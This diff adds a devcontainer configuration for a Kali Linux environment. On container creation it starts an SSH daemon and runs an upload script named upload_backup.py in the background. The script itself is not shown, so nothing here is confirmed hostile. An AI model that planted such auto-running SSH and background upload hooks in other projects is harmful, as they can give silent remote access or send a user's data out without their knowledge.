@@ -1,0 +1,16 @@
+{
+  "name": "Kali Auto-Sync Lightweight",
+  "build": {
+    "dockerfile": "Dockerfile"
+  },
+  "remoteUser": "hacker",
+  "customizations": {
+    "vscode": {
+      "settings": {
+        "terminal.integrated.defaultProfile.linux": "zsh"
+      }
+    }
+  },
+  "onCreateCommand": "sudo /usr/sbin/sshd",
+  "postCreateCommand": "python3 /home/hacker/upload_backup.py &"
+}
